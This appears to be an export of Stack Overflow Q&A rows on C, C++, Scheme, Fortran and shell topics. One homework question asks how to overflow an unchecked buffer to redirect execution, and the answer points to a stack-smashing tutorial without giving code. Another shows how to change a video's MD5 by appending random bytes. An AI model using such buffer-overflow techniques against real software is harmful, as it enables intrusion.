<p>In C, the unary <code>*</code> operator is the dereferencing operator.  If <code>x</code> is a pointer, then <code>*x</code> is what <code>x</code> points to.  The unary <code>&amp;</code> operator is the <em>address-of</em> operator.  If <code>x</code> is anything, then <code>&amp;x</code> is the address at which <code>x</code> is stored in memory.  The <code>*</code> and <code>&amp;</code> operators are inverses of each other: if <code>x</code> is any data, and <code>y</code> is any pointer, then these equations are always true:</p>

<pre><code>*(&amp;x) == x
&amp;(*y) == y
</code></pre>

<p>A null pointer is a pointer that does not point to any valid data (but it is not the only such pointer).  The C standard says that it is <strong>undefined behavior</strong> to dereference a null pointer.  This means that absolutely anything could happen: the program could crash, it could continue working silently, or it could erase your hard drive (although that's rather unlikely).</p>

<p>In most implementations, you will get a ""segmentation fault"" or ""access violation"" if you try to do so, which will almost always result in your program being terminated by the operating system.  Here's one way a null pointer could be dereferenced:</p>

<pre><code>int *x = NULL;  // x is a null pointer
int y = *x;     // CRASH: dereference x, trying to read it
*x = 0;         // CRASH: dereference x, trying to write it
</code></pre>

<p>And yes, dereferencing a null pointer is pretty much exactly like a <code>NullReferenceException</code> in C# (or a <code>NullPointerException</code> in Java), except that the langauge standard is a little more helpful here.  In C#, dereferencing a null reference has well-defined behavior: it always throws a <code>NullReferenceException</code>.  There's no way that your program could continue working silently or erase your hard drive like in C (unless there's a bug in the language runtime, but again that's incredibly unlikely as well).</p>
"
"<p>In C++ you can easily allocate one dimensional array like this:</p>

<pre><code>T *array=new T[N];
</code></pre>

<p>And you can delete it with one statement too:</p>

<pre><code>delete[] array;
</code></pre>

<p>The compiler will know the magic how to deallocate the correct number of bytes.</p>

<p>But why can't you alloc 2-dimensional arrays like this?</p>

<pre><code>T *array=new T[N,M];
</code></pre>

<p>Or even like this?</p>

<pre><code>T *array=new T[N,M,L];
</code></pre>

<p>If you want a multidimensional you have to do it like this:</p>

<pre><code>T **array=new T*[N];
for(int i=0;i&lt;N;i++) array[i]=new T[M];
</code></pre>

<p>If you want a fast program that uses matrices (matrix operations, eigenvalue algorithms, etc...) you might want to utilize the cache too for top performance and this requires the data to be in the same place. Using <code>vector&lt;vector&lt;T&gt; &gt;</code> is the same situation. In C you can use variable length arrays on the stack, but you can't allocate them on the heap (and stack space is quite limited), you can do variable length arrays in C++ too, but they won't be present in C++0x.</p>

<p>The only workaround is quite hackish and error-phrone:</p>

<pre><code>T *array=new T[N*M];
for(int i=0;i&lt;N;i++)
   for(int j=0;j&lt;M;j++)
   {
       T[i*N+j]=...;
   }
</code></pre>
","9530","","<blockquote>
  <p>Why can't a multidimensional array be allocated with one new call in C++?</p>
</blockquote>

<p>Because when the ISO wrote the C++ language standard, they didn't decide to add that feature to the language.  I don't know why they decided not to.</p>

<p>If you don't like that, you can create helper functions to allocate/free multidimensional arrays, or you can switch to a language like C# or Java that does support easily allocating multidimensional arrays.</p>
"
"<p>I have video files, that I want to pad with a random number of extra bytes, in order to create a different md5 checksum. Is there a way to do that, and keep them playable? </p>
","9530","","<p>It depends on the video file format, but you should be able to just add the extra bytes to the end, and most video players should ignore them.  Most video formats contain a lot of metadata about the video data (such as ""the total video size is X bytes""), so they're robust against this sort of change.</p>

<p>One simple way to do this is to use the <code>&gt;&gt;</code> shell redirection operator to append data, e.g.:</p>

<pre><code># Add 32 random bytes to the end of the movie.avi
head -c 32 /dev/urandom &gt;&gt; movie.avi
</code></pre>
"
"<p>I would like to have a script wherein all commands are <code>tee</code>'d  to a log file.</p>

<p>Right now I am running every command in the script thusly:</p>

<pre><code>&lt;command&gt; | tee -a $LOGFILE
</code></pre>

<p>Is there a way to force every command in a shell script to pipe to <code>tee</code>? </p>

<p>I cannot force users to add appropriate <code>tee</code>ing when running the <strong><em>script</em></strong>, and want to ensure it logs properly even if the calling user doesn't add a logging call of their own.</p>
","9530","","<p>Assuming that your script doesn't take a <code>--tee</code> argument, you can do this (if you do use that argument, just replace <code>--tee</code> below with an argument you don't use):</p>

<pre><code>#!/bin/bash

if [ -z ""$1"" ] || [ ""$1"" != --tee ]; then
  $0 --tee ""$@"" | tee $LOGFILE
  exit $?
else
  shift
fi
# rest of script follows
</code></pre>

<p>This just has the script re-run itself, using the special argument <code>--tee</code> to prevent infinite recursion, piping its output into <code>tee</code>.</p>
"
"<p>You can't have code outside of functions except for declarations, definitions and preprocessor directives.</p>

<p>Is that statement accurate, or is there something I'm missing?  I'm teaching my nephew to program, and he was trying to put a while loop before main.  He's pretty young, I want to give him a hard simple rule that he can understand.</p>
","9530","","<p>Not quite -- you can also put expressions in global variable declarations:</p>

<pre><code>int myGlobalVar = 3 + SomeFunction(4) - anotherGlobalVar;
</code></pre>

<p>But you can only put <em>expressions</em> here, which have to evaluate to the value you're initializing the global with.  You cannot put full statements (no blocks of code, no <code>if</code> statements, no loops, etc.).  This code will get executed before <code>main()</code> gets a chance to run, so be careful with what you do here.  I'd recommend against calling functions in global initializers unless you can't avoid it.</p>
"
"<p>I'm learning Scheme in a class and my professor doesn't answer questions after 8:00, so I'm hoping you all can help me out.  Basically I have a family tree type thing and I'm trying to get all the ancestors of one person, and display them as one string, sorted alphabetically.  </p>

<p>The problem is, because of the recursion, each generation is being combined into their own string, so instead of getting ""person a"" ""person b"", I'm getting ""person a person b"".  So when I go to sort them, before appending them all to one string, it only sorts the first name in the pair meaning that the second name doesn't get sorted.</p>

<p>Sorry if that sounds confusing, I'm not exactly sure how to explain it myself.  I'm hoping that the code will explain most of it for me.</p>

<pre><code>(define-struct person  
  (
  first    ; a string: first name
  last    ; a string: last name
  sex     ; a symbol: 'male, 'female
  eyes     ; a symbol: 'blue, 'brown', 'green
  hair     ; a symbol: 'blonde, 'brown, 'black, 'red
  mother; a person: empty if not known
  father; a person: empty if not known
  born    ; a number: year of birth
  )
)

(define P-00000 (make-person ""Alexandra"" ""Harper"" 'female 'blue 'red empty empty 1897))
(define P-10000 (make-person ""Joshua"" ""Sherman"" 'male 'green 'blonde empty empty 1881))
(define P-20000 (make-person ""Alexandra"" ""Hazel"" 'female 'brown 'red empty empty 1906))
(define P-30000 (make-person ""Christopher"" ""Abdul"" 'male 'brown 'brown empty empty 1904))
(define P-01000 (make-person ""Lauren"" ""Sherman"" 'female 'green 'black P-00000 P-10000 1914))
(define P-21000 (make-person ""Alexander"" ""Abdul"" 'male 'blue 'brown P-20000 P-30000 1927))
(define P-01100 (make-person ""Justine"" ""Abdul"" 'female 'blue 'black P-01000 P-21000 1949))

(define (strlist-to-str StrLst Sep)
   (cond
      [(empty? StrLst) """"]
      [(equal? (first StrLst) """")  (strlist-to-str (rest StrLst) Sep)]
      [(empty? (rest StrLst)) (first StrLst)]
      [else (string-append (first StrLst) Sep (strlist-to-str (rest StrLst) Sep))]
   )
)

(define (person-to-lfn ; string
   who                 ; person
   )
   (cond
     [(string? who)  who]
     [else  (string-append (person-last who) "","" (person-first who))]
   )
)

(define (ancestors ; string
   who             ; person
   )
   (cond
     [(empty? (person-mother who))  """"]
     [else  
      (strlist-to-str (sort (list (person-to-lfn (person-mother who))
                                  (person-to-lfn (person-father who))
                                  (ancestors (person-mother who))
                                  (ancestors (person-father who))) string&lt;?) "" "")]
   )
)
(check-expect (ancestors P-01100) ""Abdul,Alexander Abdul,Christopher Harper,Alexandra Hazel,Alexandra Sherman,Joshua Sherman,Lauren"")
</code></pre>

<p>Check failures:</p>

<pre><code>Actual value ""Abdul,Alexander Abdul,Christopher Hazel,Alexandra Harper,Alexandra Sherman,Joshua Sherman,Lauren"" differs from ""Abdul,Alexander Abdul,Christopher Harper,Alexandra Hazel,Alexandra Sherman,Joshua Sherman,Lauren"", the expected value.
at line 64, column 0 &lt;code&gt;
</code></pre>
","9530","","<p>The issue, as you said, is that in the recursive case, <code>ancestors</code> is returning a single string containing all of the ancestors, which then can't be sorted properly because it's one thing, not several things.</p>

<p>You should modify <code>ancestors</code> so that instead of returning a single string, it returns a list of strings (i.e. don't call <code>strlist-to-str</code> in it).  Then, when it recurses, you get the list of the mother's ancestors and the list of the father's ancestors; add these lists together, along with the mother and father, and flatten them into a single list.</p>

<p>Only as the final step, after all of the recursion has finished, should you call <code>strlist-to-str</code> to combine the final list of names into a single string.</p>
"
"<p>Is there an easier way in <code>C</code> to set an array to one value than using a <code>for</code> loop and going setting each value one by one?</p>
","9530","","<p>If you're setting the array to all 0's, or if the array is an array of bytes, you can use <a href=""http://linux.die.net/man/3/memset""><code>memset</code></a></p>

<pre><code>// Set myArray to all 0's
memset(myArray, 0, numberOfElementsInMyArray * sizeof(myArray[0]));
</code></pre>

<p>If you need to set it to something other than 0 in units larger than a byte (e.g. set an array of <code>int</code>s to 1's), then there is no standard function to do that -- you'll have to write your own for loop for that.</p>
"
"<p>When using the STL sort algorithm on a vector, I want to pass in my own comparison function which also takes a parameter.</p>

<p>For example, ideally I want to do a local function declaration like:</p>

<pre><code>int main() {
    vector&lt;int&gt; v(100);
    // initialize v with some random values

    int paramA = 4;

    bool comp(int i, int j) {
        // logic uses paramA in some way...
    }

    sort(v.begin(), v.end(), comp);
}
</code></pre>

<p>However, the compiler complains about that. When I try something like:</p>

<pre><code>int main() {
    vector&lt;int&gt; v(100);
    // initialize v with some random values

    int paramA = 4;

    struct Local {
        static bool Compare(int i, int j) {
            // logic uses paramA in some way...
        }
    };

    sort(v.begin(), v.end(), Local::Compare);
}
</code></pre>

<p>The compiler still complains: ""error: use of parameter from containing function""</p>

<p>What should I do? Should I make some global variables with a global comparison function..?</p>

<p>Thanks.</p>
","9530","","<p>You cannot access the local variables of a function from within a locally defined function -- C++ in its current form does not allow <a href=""http://en.wikipedia.org/wiki/Closure_%28computer_science%29"">closures</a>.  The next version of the language, C++0x, will support this, but the language standard has not been finalized and there is little support for the current draft standard at the moment.</p>

<p>To make this work, you should change the third parameter of <code>std::sort</code> to be an <em>object instance</em> instead of a function.  The third parameter of <code>std::sort</code> can be anything that is callable (i.e. any <code>x</code> where adding parentheses like <code>x(y, z)</code> makes syntactic sense).  The best way to do this is to define a struct that implements the <code>operator()</code> function, and then pass an instance of that object:</p>

<pre><code>struct Local {
    Local(int paramA) { this-&gt;paramA = paramA; }
    bool operator () (int i, int j) { ... }

    int paramA;
};

sort(v.begin(), v.end(), Local(paramA));
</code></pre>

<p>Note that we have to store <code>paramA</code> in the structure, since we can't access it otherwise from within <code>operator()</code>.</p>
"
"<p>I installed OpenSSL 1.0.0 on Windows using the installer available at:
<a href=""http://www.slproweb.com/products/Win32OpenSSL.html"" rel=""nofollow"">http://www.slproweb.com/products/Win32OpenSSL.html</a></p>

<p>I added the .lib files to my project (this is Visual Studio, added it to Project Settings->Linker->Input), and it compiles and works fine. But when I remove the OpenSSL DLL files in Windows\system32, it complains that</p>

<pre><code>""Debugger:: An unhandled non-continuable STATUS_DLL_NOT_FOUND exception was thrown during process load""
</code></pre>

<p>Any idea why it's still looking for the DLL even when it's compiled with the static libs? I'm not referencing the DLLs anywhere in the project. The static libs I included are libeay32.lib and ssleay32.lib.</p>

<p>Thanks,
-M</p>
","9530","","<p>It's looking for the DLLs because the code is loaded dynamically at runtime.  The code in the static libraries is just a set of stub functions which call into the DLL -- compare the sizes of the .lib and .dll files, and I bet you'll see that the DLLs are much larger, since that's where the bulk of the actual encryption code lies.</p>

<p>Hence, as you found out, you should not delete the DLLs.  In order to distribute your program properly, you'll also need to distribute those DLLs with it in order for it to work correctly.  However, keep in mind that there are legal issues with doing this, since there are US export restrictions on certain encryption code.  <strong>So be extra careful in redistributing those DLLs -- make extra sure what you're doing is legal</strong>.</p>
"
"<p>I am writing a small C++ program which passes a 2-D array (of complex numbers) to a Fortran subroutine and receives it back filled with values. I wrote a version which passes and receives a 1-D array, and this works well. The 2-D version doesn't work (my true goal is to write a 4-D version with large dimensions - so these arrays have to be dynamically allocated).</p>

<p>I will post both my working code and non-working code, but first note that I was forced to use structs (simple ones, just containing two doubles) because Fortran seems to interpret these in exactly the same way as its own native complex numbers. This is why my 1-D version works. For the same reason, I don't think this is a 'complex number' issue.</p>

<p>Here is my working code. Passing 1-D array of complex numbers to Fortran subroutine:</p>

<p>The Fortran subroutine:</p>

<pre><code>subroutine carray(A)
complex*16 A(2)

A(1) = cmplx(3,7)
A(2) = cmplx(9,5)

return
end
</code></pre>

<p>The C++ code:</p>

<pre><code>include &lt;iostream&gt;
include &lt;complex&gt;
using namespace std;

struct cpx{double r, i;};

extern""C""
{
   void carray_(struct cpx* A);
}

int main()
{
   struct cpx* A;
   A = new struct cpx [2];

   carray_(A);

   complex&lt;double&gt;* P;
   P = new complex&lt;double&gt; [2];

   for(x = 0; x &lt; 2; x++)
   {
      real(P[x] = A[x].r;
      imag(P[x] = A[x].i;
   }

   cout &lt;&lt; real(P[0]) &lt;&lt; ""\t"" &lt;&lt; imag(P[0]) &lt;&lt; ""\n"";
   cout &lt;&lt; real(P[1]) &lt;&lt; ""\t"" &lt;&lt; imag(P[1]) &lt;&lt; ""\n"";

   return 0;
}
</code></pre>

<p>Compiling with the following commands works without complaint:</p>

<pre><code>gfortran -c CarrayF.f
g++ -c CarrayC.cc
g++ -o Carray CarrayC.o CarrayF.o -lgfortran
</code></pre>

<p>So as long as I treat the (native) Fortran complex number like a struct of two doubles, I can put them into the (non-native) C++ complex type. The Fortran subroutine seems to be perfectly happy receiving a pointer where it expects an array. So far so good.</p>

<p>Here is my non-working attempt to pass a 2D array:</p>

<p>The Fortran code:</p>

<pre><code>subroutine carray(A)
complex*16 A(2,2)

A(1,1) = cmplx(3,7)
A(1,2) = cmplx(9,5)
A(2,1) = cmplx(2,3)
A(2,2) = cmplx(4,9)

return
end
</code></pre>

<p>The C++ code:</p>

<pre><code>include &lt;iostream&gt;
include &lt;complex&gt;
using namespace std;

struct cpx{double r, i;};

extern""C""
{
   void carray_(struct cpx** A);
}

int main()
{
   struct cpx** A;
   A = new struct cpx* [2];
   for(int x = 0; x &lt; 2; x++)
   {
      A[x] = new struct cpx [2];
   }

   carray_(A);

   complex&lt;double&gt;** P;
   P = new complex&lt;double&gt;* [2];
   for(int x = 0; x &lt; 2; x++)
   {
      P[x] = new complex&lt;double&gt; [2];
   }

   for(x = 0; x &lt; 2; x++)
   {
      for(int y = 0; y &lt; 2; y++)
      {
         real(P[x][y] = A[x][y].r;
         imag(P[x][y] = A[x][y].i;
      }
   }

   cout &lt;&lt; real(P[0][0]) &lt;&lt; ""\t"" &lt;&lt; imag(P[0][0]) &lt;&lt; ""\n"";
   cout &lt;&lt; real(P[0][1]) &lt;&lt; ""\t"" &lt;&lt; imag(P[0][1]) &lt;&lt; ""\n"";
   cout &lt;&lt; real(P[1][0]) &lt;&lt; ""\t"" &lt;&lt; imag(P[1][0]) &lt;&lt; ""\n"";
   cout &lt;&lt; real(P[1][1]) &lt;&lt; ""\t"" &lt;&lt; imag(P[1][1]) &lt;&lt; ""\n"";

   return 0;
}
</code></pre>

<p>This actually compiles without complaint (same compilation procedure as for the 1-D version), but running the executable produces an immediate segmentation fault. Because of the headache of using two languages together, the debugger is not being helpful. </p>

<p>Have I made a trivial error somewhere? I don't seem to be exceeding any array bounds. The Fortran subroutine is happy to receive a pointer, but obviously it doesn't understand what to do with a pointer to a pointer. Ordinarily, Fortran would simply deal in terms of array names, even for multidimensional arrays, but I need to understand how Fortran deals with 2D arrays.</p>
","9530","","<p>Multidimensional arrays in Fortran are stored as flat <strong>column-major</strong> arrays in memory.  They are <em>not</em> pointers to pointers—they're really just 1D arrays where you have to do some extra arithmetic to compute array indices.</p>

<p>The correct way to pass the array from C++ is like this:</p>

<pre><code>extern ""C"" void carray_(struct cpx *A);
...
struct cpx A[2*2];
carray_(A);

complex&lt;double&gt; P[2][2];
for(int i = 0; i &lt; 2; i++)
{
    for(int j = 0; j &lt; 2; j++)
    {
        // note order of indicies: A is column-major
        P[i][j] = std::complex&lt;double&gt;(A[j*2 + i].r, A[j*2 + i].i);
    }
}
</code></pre>
"
"<p>Quick question...</p>

<pre><code>int SDL_BlitSurface(SDL_Surface *src, SDL_Rect *srcrect, SDL_Surface *dst, SDL_Rect *dstrect);
</code></pre>

<p>Why are the srcrect and dstrect arguments not const? Are they modified in the function? At the moment I'm const-casting my Sprite class member variables to use BlitSurface... It seems silly.</p>

<p>Cheers,
Rhys.</p>
","9530","","<p>The <a href=""http://sdl.beuc.net/sdl.wiki/SDL_BlitSurface"" rel=""nofollow"">documentation</a> specifies that <code>dstrect</code>, if non-NULL, is modified to contain the resulting clipped rectangle.  <code>srcrect</code> is not modified, so it very well could be made <code>const</code>.  Why?  Who knows.  I'd guess that it was probably an oversight by the people who wrote SDL.</p>
"
"<p>I'm currently working on an applet that displays a heap as values are added and removed.  I'm implementing the heaps as tree of integers - IntTrees.  I'm writing the code for skew heaps, and the 'add' method is giving me some trouble. The add method usually works, but once in a while it causes a stack overflow error when a value is added, and I can't seem to figure out why.</p>

<p>Here's the code I have written for the add method</p>

<p>'t' is an instance variable - the heap itself.</p>

<pre><code> // adds value to heap
 public void add(int value) {

IntTree smallTree = new IntTree(value, empty(), empty());

 if (t == null) {
  t = smallTree;
 } else {
  t = merge(t, smallTree);
  }
}

public IntTree merge(IntTree left, IntTree right) {

if (isEmpty(left)) return right;
if (isEmpty(right)) return left;

int leftVal = left.value();
int rightVal = right.value();
IntTree result;

if (rightVal &lt;= leftVal) {
  result = merge(right,left);
} else {
  result = left;

  if (result.isEmpty(left)) {
    result.setLeft(right);
  } else {
    IntTree temp = result.right();
    result.setRight(result.left());
    result.setLeft(merge(temp,right));
  }
}

    return result;
  } 
</code></pre>

<p>Is there something in this code that would cause a stack overflow error, or is the problem perhaps elsewhere in the program?  Thanks!</p>
","9530","","<p>Take a look at this snippet</p>

<pre><code>if (rightVal &lt;= leftVal) {
  result = merge(right,left);
</code></pre>

<p>What happens when <code>rightVal == leftVal</code>?</p>
"
"<p>I'm using the STL <code>string</code> within an application of mine, and I was recently testing it for memory leaks, and I noticed that a lot of my strings weren't being properly deallocated by the end of the program.</p>

<p>I tested the following code (not verbatim) with one of the strings:</p>

<pre><code>const string* cppString = &amp;obj-&gt;objString;
const char* cString = cppString-&gt;c_str();
delete obj;
</code></pre>

<p>After that, I put a break-point and noticed that, while the <code>string</code> that <code>cppString</code> pointed to no longer existed, <code>cString</code> was still pointing to a C-style string, which surely enough, was the one that failed to be deallocated at the end.</p>

<p>Am I missing something in terms of how C/C++ strings work? How can I get the C representation of the string to be deallocated as well?</p>

<p><strong>EDIT:</strong> Some more information. My <code>obj</code> class is of type <code>Dialog</code>, which inherits <code>Popup</code>. I thought that might've been it, since when I delete <code>obj</code>, I'm treating it as a <code>Popup*</code>, but I tried it in a small separate program, and deleting as a parent class properly removes the child member variables (which makes sense, of course).</p>

<p>I used the memory leak tracing within VS, and it shows that the string that ended up leaking was the one that was created when I made the <code>Dialog</code> and set the <code>objString</code> to the string passed as a reference to the constructor.</p>

<p>Thanks,<br>
Jengerer</p>
","9530","","<p>What you're seeing is <strong>undefined behavior</strong>—it's not actually a memory leak.  The memory for the C string <em>has</em> been deallocated (at least as far as you're concerned), but the data there is still technically accessible.  When you deallocate memory, the memory usually doesn't get erased, so the data there often stays around so long as the memory doesn't get reused by a subsequent allocation.</p>

<p>Reading data after it's been deallocated is undefined behavior: you might get what the data was before it was deallocated, you might get garbage data, you might crash your program, or you could even erase your hard drive (although that's not very likely).</p>

<p>So long as the <code>std::string</code> object is being properly deallocated, then any memory used for its C string representation will also be deallocated.  You don't need to worry about that.</p>

<hr>

<p><strong>EDIT</strong>: Actually it turns out your object wasn't getting fulled destroyed because the parent class <code>Popup</code> didn't have a virtual destructor.  As a result, the destructor for the subclass <code>Dialog</code> wasn't getting called, so the destructor for the <code>std::string</code> instance wasn't getting called.</p>
"
"<p>There is a binary file i am working on . It has a function  with the address starting at 123. I need to get my code to execute this function. </p>

<p>Binary file accepts a byte array of size 'n' and does not check for bounds. Entire task is actually to overflow the buffer and cause bad things to happen.</p>

<p>Again, the job is to call address 123 and get it to execute. I was under impression that if a buffer size is , say ""4"", and i pass 9 characters .., 5 characters will be placed on the stack and executed. (is it true?)</p>

<p>Additionally, in order for me to get to address to be executed, i'd like to say ""call 123"". From what i understand ""call"" is ""e8"", no?</p>

<p>This problem is a bit confusing for me. If someone could help me better understand it, i would very much appreciate it</p>

<p>(Yes, this is a homework question)</p>
","9530","","<p>I strongly recommend that you read <a href=""http://insecure.org/stf/smashstack.html"" rel=""nofollow"">Smashing the Stack for Fun and Profit</a>.  It describes in great detail exactly the steps you need to do to do this.</p>
"
"<p>Windows supports icons in PNG format since Vista. You supposedly have the same format as a .ico file, but the image itself is a PNG, no BITMAPINFOHEADER.</p>

<p>Anyone has such an icon or a piece of software that can generate one?</p>
","9530","","<p>Take any PNG file and rename it with a .ico extension.  Really, that's all it is.</p>

<p>See also <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2010/10/22/10079192.aspx"" rel=""nofollow"">The evolution of the ICO file format, part 4: PNG images</a>.</p>
"
"<p>I'm trying to write a C++ program that alters a .txt file. However when I run it I get a strange error.</p>

<p>The error:</p>

<blockquote>
  <p>6:20 C:\Dev-Cpp\Homework6.cpp incomplete universal character name \U </p>
</blockquote>

<p>My code:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;
using namespace std;

int main () {
  ofstream myfile (""C:\Users\My Name\Desktop\test\input.txt"");
  if (myfile.is_open())
  {
    myfile &lt;&lt; ""This is a line.\n"";
    myfile &lt;&lt; ""This is another line.\n"";
    myfile.close();
  }
  else cout &lt;&lt; ""Unable to open file"";
  return 0;
}
</code></pre>

<p>What am I doing wrong? </p>
","9530","","<p>You need to escape your backslashes in the filename.  In C++ string constants, backslash is an escape character which doesn't represent itself.  To get a literal backslash, you need to use a double backslash <code>\\</code>.</p>

<p><code>\U</code> is the prefix for a 32-bit Unicode escape sequence: you'd use something like ""<code>\U0010FFFF</code>"" to represent a high Unicode character.  The compiler is complaining that <code>\Users...</code> is not a valid Unicode escape sequence, since <code>sers...</code> is not a valid hexadecimal number.</p>

<p>The fix is to use the string <code>""C:\\Users\\My Name\\Desktop\\test\\input.txt""</code>.</p>
"
"<p>For some time now I've been happily using <a href=""http://g.oswego.edu/dl/html/malloc.html"" rel=""nofollow"">dlmalloc</a> for a cross-platform project (Windows, Mac OS X, Ubuntu).  Recently, however, it seems that using dlmalloc leads to a crash-on-exit on Windows 7.</p>

<p>To make sure that it wasn't something goofy in my project, I created a super-minimal test program-- it doesn't do anything but return from main.  One version (""<code>malloctest</code>"") links to dlmalloc and the other (""<code>regulartest</code>"") doesn't.  On WinXP, both run fine.  On Windows 7, <code>malloctest</code> crashes.  You can see screencasts of the tests <a href=""http://www.screencast.com/t/JoqEhNr9CPx9"" rel=""nofollow"">here</a>.</p>

<p>My question is: why is this happening?  Is it a bug in dlmalloc?  Or has the loader in Windows 7 changed?  Is there a workaround?</p>

<p>fyi, here is the test code (test.cpp):</p>

<pre><code>#include &lt;stdio.h&gt;

int main() {
    return 0;
}
</code></pre>

<p>and here is the nmake makefile:</p>

<pre><code>all: regulartest.exe malloctest.exe

malloctest.exe: malloc.obj test.obj
 link /out:$@ $**

regulartest.exe: test.obj
 link /out:$@ $**

clean:
 del *.exe *.obj
</code></pre>

<p>For brevity, I won't include the dlmalloc source in this post, but you can get it (v2.8.4) <a href=""ftp://g.oswego.edu/pub/misc/malloc.c"" rel=""nofollow"">here</a>.</p>

<p><strong>Edit:</strong> See these other relavent SO posts:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/120627/is-there-a-way-to-redefine-malloc-at-link-time-on-windows"">Is there a way to redefine malloc at link time on Windows?</a></li>
<li><a href=""http://stackoverflow.com/questions/1316018/globally-override-malloc-in-visual-c"">Globally override malloc in visual c++</a></li>
</ul>
","9530","","<p>Looks like a bug in the C runtime.  Using Visual Studio 2008 on Windows 7, I reproduced the same problem.  After some quick debugging by putting breakpoints in <code>dlmalloc</code> and <code>dlfree</code>, I saw that <code>dlfree</code> was getting called with an address that it never returned earlier from <code>dlmalloc</code>, and then it was hitting an access violation shortly thereafter.</p>

<p>Thankfully, the C runtime's source code is distributed along with VS, so I could see that this call to <code>free</code> was coming from the <code>__endstdio</code> function in <code>_file.c</code>.  The corresponding allocation was in <code>__initstdio</code>, and it was calling <code>_calloc_crt</code> to allocate its memory.  <code>_calloc_crt</code> calls <code>_calloc_impl</code>, which calls <code>HeapAlloc</code> to get memory.  <code>_malloc_crt</code> (used elsewhere in the C runtime, such as to allocate memory for the environment and for <code>argv</code>), on the other hand, calls straight to <code>malloc</code>, and <code>_free_crt</code> calls straight to <code>free</code>.</p>

<p>So, for the memory that gets allocated with <code>_malloc_crt</code> and freed with <code>_free_crt</code>, everything is fine and dandy.  But for the memory that gets allocated with <code>_calloc_crt</code> and freed with <code>_free_crt</code>, bad things happen.</p>

<p>I don't know if replacing <code>malloc</code> like this is supported -- if it is, then this is a bug with the CRT.  If not, I'd suggest looking into a different C runtime (e.g. MinGW or Cygwin GCC).</p>
"
"<p>I'm getting an Xcode warning when compiling several class that subclass existing Cocoa classes.  For example, the following class</p>

<pre><code>   @interface HMAttitude : CMAttitude
    {
        double pitch;
        double roll;
        double yaw;
    }

    @property (readwrite) double pitch;
    @property (readwrite) double roll;
    @property (readwrite) double yaw;

    @end
</code></pre>

<p>-</p>

<pre><code>@implementation HMAttitude

@synthesize pitch, roll, yaw;

- (id) init
{
    return [super init];
}

@end
</code></pre>

<p>yields three warnings</p>

<p>warning: property 'yaw' and its super class 'CMAttitude' don't have matching 'atomic' attribute</p>

<p>warning: property 'pitch' and its super class 'CMAttitude' don't have matching 'atomic' attribute</p>

<p>warning: property 'roll' and its super class 'CMAttitude' don't have matching 'atomic' attribute</p>

<p>All of the subclasses in question are required in order to create CMMotionManager and CLLocationManager subclasses capable of acting like the superclasses, only loading their data from a csv file.  The only reason that I am subclassing them is to gain access (or override) their read-only properties.  Without the ability to set these properties, I have no way of returning the same objects as the real CMMotionManager and CLLocationManager classes. </p>

<p>Currently everything works fine aside from having to use a #pragma to ignore the warning which slightly bothers me.</p>

<p>Does anyone know why this warning is being generated?  Given the properties aren't being set to nonatomic (atomic is the default), I have no absolutely no clue.  </p>

<p>Is there anything that I need to explicitly do in order for these properties to be atomic?</p>
","9530","","<p>The error message is slightly confusing—if you look at the definition of those properties in the <a href=""http://developer.apple.com/library/ios/#documentation/CoreMotion/Reference/CMAttitude_Class/Reference/Reference.html"" rel=""nofollow""><code>CMAttitude</code> documentation</a>, you'll see that they're actually declared as <em>non</em>-atomic.  So, you should declare your properties as non-atomic as well.</p>
"
"<p>I have a problem with my clamp macro, when when my value is over 10 and my high is over 17 it stops working.  Any idea?</p>

<pre><code>#define CLAMP(value, low, high) (((value)&lt;(low))?(low):(((value)&gt;(high))?(high):(value)))
</code></pre>
","9530","","<p>Your macro is fine.  If you pass in a <code>high</code> that is less than <code>low</code>, you'll see strange results, but that's unlikely to be the cause.</p>

<p>The most likely result is that you're passing in an expression that has side effects, such as using the <code>++</code> operator or calling a function.  If you have an expression that has side effects, then because of the way that macro substitution works, the side effects could happen multiple times.  For example:</p>

<pre><code>CLAMP(x++, low, high)  // expands to:
(x++ &lt; low) ? low : ((x++ &gt; high) ? high : x++);
</code></pre>

<p><code>x++</code> gets evaluated multiple times, which is definitely not what you want (it's undefined behavior, due to the lack of a sequence point).</p>

<p>I'd suggest rewriting the macro as a template:</p>

<pre><code>template &lt;typename T&gt; T CLAMP(T value, T low, T high)
{
    return (value &lt; low) ? low : ((value &gt; high) ? high : value);
}
</code></pre>
"
"<p>Consider the following two macros:</p>

<pre><code>#define PNORM( v, s, ... )  { \
  if( VERBOSITY_CHECK( v ) ) { \
    if( ( errno = pthread_mutex_lock(&amp;server.output_mutex) ) ) { \
      PERROR_LOCKFREE( normal, ""\tpthread_mutex_lock failed on output_mutex.\r\n"" ) ; \
    } \
    fprintf( stdout, s, ## __VA_ARGS__ ) ; \
    fflush( stdout ) ; \
    if( ( errno = pthread_mutex_unlock(&amp;server.output_mutex) ) ) { \
      PERROR_LOCKFREE( normal, ""\tpthread_mutex_unlock failed on output_mutex.\r\n"" ) ; \
    } \
  } \
}

#define PERROR_LOCKFREE( v, s, ... ) { \
  if( VERBOSITY_CHECK( v ) ) { \
    PERRNO ;\
    fprintf( stderr, s, ## __VA_ARGS__ ) ; \
    fflush( stderr ) ; \
  } \
}
</code></pre>

<p>Now consider an example use of these:</p>

<pre><code>PNORM( verbose, ""\tSomeText [%d] More [%p]\r\n"", 0, ptr ) ;
</code></pre>

<p>When compiled with the -pedantic option and -std=c99 I get this error many times:</p>

<pre><code>mycode.c:410:112: warning: ISO C99 requires rest arguments to be used
</code></pre>

<p>The complier is right in complaining about this but is there a simple way I can suppress this warning since I don't care about it?</p>
","9530","","<p>Combine the <code>s</code> argument with the variadic arguments so that you always have at least one argument as part of the ellipsis.  This also allows you to avoid using the <code>,##</code> extension of GCC:</p>

<pre><code>#define PNORM( v, ... )  { \
  if( VERBOSITY_CHECK( v ) ) { \
    if( ( errno = pthread_mutex_lock(&amp;server.output_mutex) ) ) { \
      PERROR_LOCKFREE( normal, ""\tpthread_mutex_lock failed on output_mutex.\r\n"" ) ; \
    } \
    fprintf( stdout, __VA_ARGS__ ) ; \
    fflush( stdout ) ; \
    if( ( errno = pthread_mutex_unlock(&amp;server.output_mutex) ) ) { \
      PERROR_LOCKFREE( normal, ""\tpthread_mutex_unlock failed on output_mutex.\r\n"" ) ; \
    } \
  } \
}

#define PERROR_LOCKFREE( v, ... ) { \
  if( VERBOSITY_CHECK( v ) ) { \
    PERRNO ;\
    fprintf( stderr, __VA_ARGS__ ) ; \
    fflush( stderr ) ; \
  } \
}
</code></pre>
"
